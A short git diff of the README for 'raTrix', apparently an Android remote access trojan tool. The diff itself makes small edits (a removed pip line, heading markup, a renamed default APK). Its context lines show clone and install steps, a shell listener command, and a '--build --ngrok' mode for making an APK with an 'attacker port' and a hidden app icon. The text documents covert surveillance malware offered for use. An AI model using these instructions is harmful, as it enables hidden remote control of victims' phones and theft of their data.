@@ -29,7 +29,6 @@ pkg install openjdk-17
 pkg install aapt
 git clone https://github.com/MrpasswordTz/raTrix.git
 cd raTrix
-pip install -r requirements.txt 
 ```
 
 # usages building mode
@@ -75,13 +74,13 @@ Example: python3 raTrix.py --shell -i 192.168.16.216 -p 443
     getMACAddress              --> returns the mac address of the device
     exit                       --> exit the interpreter
 ```
-# Additional information in ngrok conf
+# <u> Additional information in ngrok conf </u>
 ```
 Usage:
   python3 raTrix.py --build --ngrok [module]
   module:
     -p, --port              Attacker port number (optional by default its set to 8000)
-    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
+    -o, --output            Name for the apk file (optional by default its set to "bongosec.apk")
     -icon, --icon           Visible icon after installing apk (by default set to hidden)
 ```
 
